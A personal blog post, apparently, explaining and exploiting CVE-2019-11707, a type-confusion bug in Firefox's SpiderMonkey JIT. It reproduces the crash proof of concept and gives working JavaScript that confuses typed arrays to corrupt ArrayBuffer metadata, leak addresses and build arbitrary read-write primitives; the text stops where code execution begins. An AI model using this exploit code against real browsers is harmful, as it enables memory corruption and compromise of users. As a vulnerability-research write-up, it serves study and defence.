I"ÔÕ<p>I was always very curious about vulnerabilities that kept popping up in the JIT compilers of various popular browsers. A couple of months I came across <code class="language-plaintext highlighter-rouge">CVE-2019-11707</code>, which was a type-confusion bug in <code class="language-plaintext highlighter-rouge">array_pop</code>, found by <a href="https://twitter.com/5aelo">saelo</a> from Googleâ€™s Project Zero Team and <a href="https://twitter.com/coinbase">coinbase security</a> and a few days ago decided to try and write an exploit for the same. This post focuses mainly on the exploitation part. By the way, this is my first time trying to exploit a JIT bug, so if anyone reading this finds any errors in the post please do correct me :) So lets dive inâ€¦.</p>

<h1 id="vulnerability">Vulnerability</h1>

<p>The vulnerability has actually been well described by saelo on the <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1820">Project Zero bug tacker</a>. Anyway Iâ€™ll go over the essential details here.</p>

<p>So the main issue here was that, IonMonkey, when inlining <code class="language-plaintext highlighter-rouge">Arrary.prototype.pop</code>, <code class="language-plaintext highlighter-rouge">Arrary.prototype.push</code>, and <code class="language-plaintext highlighter-rouge">Arrary.prototype.slice</code> was not checking for indexed elements on itâ€™s prototype. It only checks if there are any indexed elements on the <code class="language-plaintext highlighter-rouge">Array</code> prototype chain, but like saelo explains, this can easily be bypassed using an intermediate chain between the target object and the Array prototype.</p>

<p>So what is inlining and prototype chains? Lets briefly go over these before actually delving deeper into the bug details.</p>

<p>A prototype is JavaScriptâ€™s way of implementing inheritance. It basically allows us to share properties and methods between various objects (we can think of objects as corresponding to classes in other OOP languages).</p>

<p>One of my <a href="https://twitter.com/a0xnirudh">team-mates</a> have written quite a thorough <a href="https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/">article</a> on JS prototypes and I would encourage someone new to this concept to read the first 5 section of his post. An in depth post on prototypes can be found on the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">MDN page</a>.</p>

<p>Inline caching basically means to save the result of a previous lookup so that the next time the same lookup takes place, the saved value is directly used and the cost of the lookup is saved. Thus if we are trying to call, say, <code class="language-plaintext highlighter-rouge">Array.pop()</code> then the initial lookup involves the following - fetching the prototype of the array object, then searching through its properties for the <code class="language-plaintext highlighter-rouge">pop</code> function and finally fetching the address of the pop function. Now if the <code class="language-plaintext highlighter-rouge">pop</code> function is inlined at this point, then the address of this function is saved and the next time <code class="language-plaintext highlighter-rouge">Array.pop</code> is called, all these lookups need not be re-computed.</p>

<p><a href="https://twitter.com/mathias">Mathais Baynens</a>, a v8 developer, has written a couple of really good articles on <a href="https://mathiasbynens.be/notes/shapes-ics">inline caching</a> and <a href="https://mathiasbynens.be/notes/prototypes">prototypeâ€™s</a></p>

<p>Now lets take a look at the crashing sample found by saelo</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td> --><td class="rouge-code"><pre><span class="c1">// Run with --no-threads for increased reliability</span>
<span class="kd">const</span> <span class="nx">v4</span> <span class="o">=</span> <span class="p">[{</span><span class="na">a</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span> <span class="p">{</span><span class="na">a</span><span class="p">:</span> <span class="mi">1</span><span class="p">},</span> <span class="p">{</span><span class="na">a</span><span class="p">:</span> <span class="mi">2</span><span class="p">},</span> <span class="p">{</span><span class="na">a</span><span class="p">:</span> <span class="mi">3</span><span class="p">},</span> <span class="p">{</span><span class="na">a</span><span class="p">:</span> <span class="mi">4</span><span class="p">}];</span>
<span class="kd">function</span> <span class="nx">v7</span><span class="p">(</span><span class="nx">v8</span><span class="p">,</span><span class="nx">v9</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">v4</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">v4</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="na">a</span><span class="p">:</span> <span class="mi">5</span><span class="p">};</span>
    <span class="p">}</span>

    <span class="c1">// pop the last value. IonMonkey will, based on inferred types, conclude that the result</span>
    <span class="c1">// will always be an object, which is untrue when  p[0] is fetched here.</span>
    <span class="kd">const</span> <span class="nx">v11</span> <span class="o">=</span> <span class="nx">v4</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>

    <span class="c1">// Then if will crash here when dereferencing a controlled double value as pointer.</span>
    <span class="nx">v11</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>

    <span class="c1">// Force JIT compilation.</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">v15</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">v15</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="nx">v15</span><span class="o">++</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">=</span> <span class="p">[{</span><span class="na">a</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span> <span class="p">{</span><span class="na">a</span><span class="p">:</span> <span class="mi">1</span><span class="p">},</span> <span class="p">{</span><span class="na">a</span><span class="p">:</span> <span class="mi">2</span><span class="p">}];</span>
<span class="nx">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mf">1.8629373288622089</span><span class="nx">e</span><span class="o">-</span><span class="mi">06</span><span class="p">;</span>
<span class="nx">v4</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">=</span> <span class="nx">p</span><span class="p">;</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">v31</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">v31</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">v31</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">v7</span><span class="p">();</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Right, so initially an array, <code class="language-plaintext highlighter-rouge">v4</code> is created with all the elements as objects. SpiderMonkeyâ€™s type inference system, notices this and infers that the const array <code class="language-plaintext highlighter-rouge">v4</code> will always hold objects.</p>

<p>Now another array <code class="language-plaintext highlighter-rouge">p</code> is initialized with all objects and <code class="language-plaintext highlighter-rouge">p[0]</code> is set to a float value. Now comes the interesting part. The prototype of the array <code class="language-plaintext highlighter-rouge">v4</code> is changed but the type inference <em>system does not track this</em>. Interesting but not a bug.</p>

<p>So lets look at the function <code class="language-plaintext highlighter-rouge">v7</code>.  While there are elements in the array, they are simply popped out and their <code class="language-plaintext highlighter-rouge">a</code> property is accessed.</p>

<p>The <code class="language-plaintext highlighter-rouge">for</code> loop in the tail of the function forces IonMonkey to JIT compile this function into native assembly.</p>

<p>While inlining <code class="language-plaintext highlighter-rouge">Array.pop</code>, IonMonkey saw that the type returned by <code class="language-plaintext highlighter-rouge">Array.pop</code> is the same as the inferred types and thus did not emit any <a href="http://smallcultfollowing.com/babysteps/blog/2012/07/30/type-inference-in-spidermonkey/#type-barriers">Type Barrier</a>. It then assumes that the return type will always be an object and proceeds to remove all type checks on the popped element.</p>

<p>And here lies the bug. While inlining <code class="language-plaintext highlighter-rouge">Array.pop</code>, IonMonkey should have checked that the prototype of the array does not have any indexed properties. Instead, it only check that the <em>ArrayPrototype</em> does not have any indexed properties. So this means that if we have an intermediate prototype between the array and the ArrayPrototype, then the elements on that wont be checked ! Here is the relevant snippet from <code class="language-plaintext highlighter-rouge">js/src/jit/MCallOptimize.cpp</code> in the function <code class="language-plaintext highlighter-rouge">IonBuilder::inlineArrayPopShift</code></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre>
<span class="kt">bool</span> <span class="n">hasIndexedProperty</span><span class="p">;</span>
<span class="n">MOZ_TRY_VAR</span><span class="p">(</span><span class="n">hasIndexedProperty</span><span class="p">,</span> <span class="n">ArrayPrototypeHasIndexedProperty</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">script</span><span class="p">()));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">hasIndexedProperty</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">trackOptimizationOutcome</span><span class="p">(</span><span class="n">TrackedOutcome</span><span class="o">::</span><span class="n">ProtoIndexedProps</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">InliningStatus_NotInlined</span><span class="p">;</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Hereâ€™s how this can be bypassed</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre>
array -&gt; custom_prototype -&gt; ArrayPrototype -&gt; ObjectPrototype -&gt; NULL
              |                   |
              |                   +-&gt; Check for indexed elements
              |                        are made on this
              |
              +-&gt; No check for indexed elements.
                 So we place some here!

</pre></td></tr></tbody></table></code></pre></div></div>

<p>So what is so great about placing indexed elements on the prototype of the Array? When the array is a sparse one and <code class="language-plaintext highlighter-rouge">Array.pop</code> encounters an <code class="language-plaintext highlighter-rouge">empty</code> element ( <code class="language-plaintext highlighter-rouge">JS_ELEMENTS_HOLE</code> ), it scans up the prototype chain for a prototype that has indexed elements, and an element corresponding to the desired index. For eg,</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre><span class="nx">js</span><span class="o">&gt;</span> <span class="nx">a</span><span class="o">=</span><span class="p">[]</span>
<span class="p">[]</span>
<span class="nx">js</span><span class="o">&gt;</span> <span class="nx">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span> <span class="c1">// Sparse Array - element at index 0 does not exist</span>
<span class="mi">1</span>
<span class="nx">js</span><span class="o">&gt;</span> <span class="nx">a</span>
<span class="p">[,</span> <span class="mi">1</span><span class="p">]</span>
<span class="nx">js</span><span class="o">&gt;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">__proto__</span><span class="o">=</span><span class="p">[</span><span class="mi">1234</span><span class="p">]</span>
<span class="p">[</span><span class="mi">1234</span><span class="p">]</span>
<span class="nx">js</span><span class="o">&gt;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">pop</span><span class="p">()</span>
<span class="mi">1</span>
<span class="nx">js</span><span class="o">&gt;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">pop</span><span class="p">()</span> <span class="c1">// Since a[0] is empty, and a.__proto__[0] exists, a.__proto__[0] is returned by Array.pop</span>
<span class="mi">1234</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now the problem - while JIT compiling the function <code class="language-plaintext highlighter-rouge">v7</code>, all type checks were removed as the observed types were same as inferred one and the TI system does not track types on prototypes. After all original elements have been popped off the array <code class="language-plaintext highlighter-rouge">v4</code>, if <code class="language-plaintext highlighter-rouge">v7</code> is called again, <code class="language-plaintext highlighter-rouge">v4[3]</code> is set to an object. This means that <code class="language-plaintext highlighter-rouge">v4</code> is now a sparse array since <code class="language-plaintext highlighter-rouge">v4[0]</code>, <code class="language-plaintext highlighter-rouge">v4[1]</code> and <code class="language-plaintext highlighter-rouge">v4[2]</code> are empty. So <code class="language-plaintext highlighter-rouge">Array.pop</code> while trying to pop off <code class="language-plaintext highlighter-rouge">v4[2]</code> and <code class="language-plaintext highlighter-rouge">v4[1]</code>, returns values from the prototype. Now when it tries to do the same for <code class="language-plaintext highlighter-rouge">v4[0]</code>, a float value is returned instead of an object. But Ion still thinks that the value returned by <code class="language-plaintext highlighter-rouge">Array.pop</code> (float now) is an object, since there are no type checks! Ion then goes on to the next part of the PoC code and tries to fetch the property <code class="language-plaintext highlighter-rouge">a</code> of the returned object. But it crashes here as the value returned is not a pointer to an object but a user controlled float.</p>

<h1 id="gaining-arbitrary-read-write">Gaining arbitrary read-write</h1>

<p>I spent quite some time trying to get leaks. Initially my idea was to create an array of floats and set an element on the prototype to an object. Thus Ion would assume that <code class="language-plaintext highlighter-rouge">Array.pop</code> always returns a float and would treat an object pointer as a float and leak out the address of the pointer.</p>

<p>But this was not to be as due to some reason, there was a check in the emitted code to verify that the value returned by <code class="language-plaintext highlighter-rouge">Array.pop</code> was a valid float or not. An object pointer is a tagged pointer and thus an invalid float value. I am not sure why that check was there in the code, but due to that I was unable to get leaks from this method and had to spent some time thinking of an alternative.</p>

<p>By the way I had also written an <a href="https://vigneshsrao.github.io/play-with-spidermonkey/">post on some SpiderMonkey data-structures and concepts</a> which I will be using soon.</p>

<h2 id="confusing-uint8array-and-uint32array">Confusing Uint8Array and Uint32Array</h2>

<p>Since the float approach did not work, I was playing around with how different types of objects are accessed when JIT compiled. While looking at <a href="https://vigneshsrao.github.io/play-with-spidermonkey/#typed-arrays">typed array</a> assignment, I came across something interesting</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre><span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="n">rcx</span><span class="o">+</span><span class="mh">0x28</span><span class="p">]</span> <span class="c1"># rcx contains the starting address of the typed array</span>
<span class="n">cmp</span>    <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
<span class="n">jbe</span>    <span class="mh">0x6c488017337</span>
<span class="n">xor</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>
<span class="n">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
<span class="n">cmovb</span>  <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
<span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="n">rcx</span><span class="o">+</span><span class="mh">0x38</span><span class="p">]</span> <span class="c1"># after this rcx contains the underlying buffer</span>
<span class="n">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="n">rcx</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span><span class="mh">0x80</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Here <code class="language-plaintext highlighter-rouge">rcx</code> is the pointer to the typed array and <code class="language-plaintext highlighter-rouge">eax</code> contains the index we are assigning. <code class="language-plaintext highlighter-rouge">[rcx+0x28]</code> actually holds the size of the typed array. So a check is made to ensure that the index is less than the size but no check is made to verify the shape of the object (as type checks are removed). This means that, if the  compiled JIT code is for a <code class="language-plaintext highlighter-rouge">Uint32Array</code> and the prototype contains a <code class="language-plaintext highlighter-rouge">Uint8Array</code>, there will be an overflow. This is because Ion always expects a <code class="language-plaintext highlighter-rouge">Uint32Array</code> (evident from the last line of the assembly code, where it is directly doing a <code class="language-plaintext highlighter-rouge">mov DWORD PTR</code>), but if the typed array is a <code class="language-plaintext highlighter-rouge">Uint8Array</code>, then itâ€™s size will be larger (because now each element is of one byte each instead of a dword).</p>

<p>Thus if we pass a index that is larger than than the <code class="language-plaintext highlighter-rouge">Uint32Array</code> size it will pass the check and get initialized.</p>

<p>For example the above code is the compiled form for -</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="nx">v11</span><span class="p">[</span><span class="nx">a1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Where v11 = a <code class="language-plaintext highlighter-rouge">Uint32Array</code>. Lets say that the size of the underlying <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> for this is 32 bytes. That means the size of this <code class="language-plaintext highlighter-rouge">Uint32Array</code> is 32/4 = 8 elements. Now if v11 is suddenly changed to a <code class="language-plaintext highlighter-rouge">Uint8Array</code> over the same underlying <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>, the size (<code class="language-plaintext highlighter-rouge">[rcx+0x28]</code>) is 32/1 = 32 elements. But while assigning the value, the code is still using a <code class="language-plaintext highlighter-rouge">mov DWORD PTR</code> instead of a <code class="language-plaintext highlighter-rouge">mov BYTE PTR</code>. Thus if we give the index as 30, the check is passed as it is compared with 32 (not 8 :). Thus we write to <code class="language-plaintext highlighter-rouge">buffer_base+(30*4) = buffer_base+120</code> whereas the buffer is only 32 bytes long!</p>

<p>Now all we have to do is convert a buffer overflow to an arbitrary read-write primitive. This overflow is in the buffer of the <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>. Now if the buffer is small enough (I think &lt; 96 bytes, not sure though), then this buffer is inlined, or in other words, lies exactly after the metadata of the <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> class. First lets take a look at the code that can achieve this overflow.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td> --><td class="rouge-code"><pre>
<span class="nx">buf</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
  <span class="nx">buf</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x20</span><span class="p">));</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">abuf</span> <span class="o">=</span> <span class="nx">buf</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>

<span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">abuf</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">e</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">e</span><span class="p">];</span>

<span class="kd">function</span> <span class="nx">vuln</span><span class="p">(</span><span class="nx">a1</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">arr</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/*

    If the length of the array becomes zero then we set the third element of
    the array thus converting it into a sparse array without changing the
    type of the array elements. Thus spidermonkey's Type Inference System does
    not insert a type barrier.

    */</span>

    <span class="kd">const</span> <span class="nx">v11</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
    <span class="nx">v11</span><span class="p">[</span><span class="nx">a1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">v15</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">v15</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">v15</span><span class="o">++</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">}</span>

<span class="nx">p</span> <span class="o">=</span> <span class="p">[</span><span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">abuf</span><span class="p">),</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">e</span><span class="p">];</span>
<span class="nx">arr</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">=</span> <span class="nx">p</span><span class="p">;</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">v31</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">v31</span> <span class="o">&lt;</span> <span class="mi">2000</span><span class="p">;</span> <span class="nx">v31</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">vuln</span><span class="p">(</span><span class="mi">18</span><span class="p">);</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">buf</code> is an array of <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>, each of size 0x20. In the memory, all these allocated <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> will lie consecutively. Here is how they will be -</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td> --><td class="rouge-code"><pre>
                  +-&gt; group                +-&gt;shape
                  |                        |
0x7f8e13a88280:  0x00007f8e13a798e0  0x00007f8e13aa1768

                  +-&gt; slots                +-&gt;elements (Empty in this case)
                  |                        |
0x7f8e13a88290:  0x0000000000000000  0x000055d6ee8ead80

                  +-&gt; Shifted pointer
                  |   pointing to          +-&gt; size in bytes of the data buffer
                  |   data buffer          |
0x7f8e13a882a0:  0x00003fc709d44160  0xfff8800000000020

                  +-&gt; Pointer
                  |   pointing to          +-&gt; flags
                  |   first view           |
0x7f8e13a882b0:  0xfffe7f8e15e00480  0xfff8800000000000

0x7f8e13a882c0:  0x0000000000000080  0x0000000000000000  # data buffer. Size is
0x7f8e13a882d0:  0x0000000000000000  0x0000000000000000  # 0x20 bytes

0x7f8e13a882e0:  0x00007f8e13a798e0  0x00007f8e13aa1768  # Next ArrayBuffer in the
0x7f8e13a882f0:  0x0000000000000000  0x000055d6ee8ead80  # buf array
0x7f8e13a88300:  0x00003fc709d44190  0xfff8800000000020
0x7f8e13a88310:  0xfffa000000000000  0xfff8800000000000

0x7f8e13a88320:  0x0000000000000000  0x0000000000000000  # data buffer of the second
0x7f8e13a88330:  0x0000000000000000  0x0000000000000000  # ArrayBuffer

0x7f8e13a88340:  0x00007f8e13a798e0  0x00007f8e13aa1768
0x7f8e13a88350:  0x0000000000000000  0x000055d6ee8ead80
0x7f8e13a88360:  0x00003fc709d441c0  0xfff8800000000020
0x7f8e13a88370:  0xfffa000000000000  0xfff8800000000000

0x7f8e13a88380:  0x0000000000000000  0x0000000000000000
0x7f8e13a88390:  0x0000000000000000  0x0000000000000000

</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now if we have an overflow in the data buffer of the second element on the <code class="language-plaintext highlighter-rouge">buf</code> array, then we can go and edit the metadata of the consecutive <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>. We can target the length field of the <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>, which is the one that actually specifies the length of the data buffer. Once we increase that, the third <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> in the <code class="language-plaintext highlighter-rouge">buf</code> array attains an arbitrary size. Thus now the data buffer of the third <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> overlaps with the fourth <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> and this allows us to leak stuff out from the metadata of the fourth <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>!</p>

<p>In the above code, we edit the length of the <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> at index 6 and set it to <code class="language-plaintext highlighter-rouge">0x80</code>. Thus now we can leak data from the metadata of the 7th element and get the leaks that we want!</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>
<span class="nx">leaker</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">[</span><span class="mi">7</span><span class="p">]);</span>
<span class="nx">aa</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">[</span><span class="mi">6</span><span class="p">]);</span>

<span class="nx">leak</span> <span class="o">=</span> <span class="nx">aa</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x58</span><span class="p">);</span>
<span class="nx">group</span> <span class="o">=</span> <span class="nx">aa</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x48</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Here, the <code class="language-plaintext highlighter-rouge">leak</code> is the address of the first view of this <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> which is a <code class="language-plaintext highlighter-rouge">Uint8Array</code> view (the leaker object). <code class="language-plaintext highlighter-rouge">group</code> is the address of this <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>. Right, so now that we have the leaks, we need to convert this into an arbitrary read-write primitive. For that we will edit the shifted pointer to data buffer of the <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> at index 7 to point to an arbitrary address. Letâ€™s keep this arbitrary address as the address of the <code class="language-plaintext highlighter-rouge">Uint8Array</code> that we just leaked. Thus, the next time we create a view on that <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>, its data buffer will be pointing to a <code class="language-plaintext highlighter-rouge">Uint8Array</code> (i.e <code class="language-plaintext highlighter-rouge">leaker</code>).</p>

<p>Now with this we can edit the data pointer of the <code class="language-plaintext highlighter-rouge">leaker</code> object and point it to anywhere we like. After that, viewing the array leaks the value at that address, and writing to the array edits the content of that address.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td> --><td class="rouge-code"><pre><span class="nx">changer</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span>

<span class="kd">function</span> <span class="nx">write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span><span class="nx">value</span><span class="p">){</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
      <span class="nx">changer</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">=</span><span class="nx">addr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
    <span class="nx">value</span><span class="p">.</span><span class="nx">reverse</span><span class="p">()</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
      <span class="nx">leaker</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">=</span><span class="nx">value</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">addr</span><span class="p">){</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
      <span class="nx">changer</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">=</span><span class="nx">addr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
    <span class="k">return</span> <span class="nx">leaker</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Cool, so now that we have arbitrary read-write in the memory, all that we have to do is to convert this to code execution!</p>

<h2 id="gaining-code-execution">Gaining code execution</h2>

<p>There are a host of ways to achieve code execution. From <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#kaizenjs">here</a>, I came across an interesting way to inject and execute shellcode, and decided to try it out in this scenario.</p>

<p>The author of the above post explains the concept beautifully, but I just over the essentials here for the sake of completeness.</p>

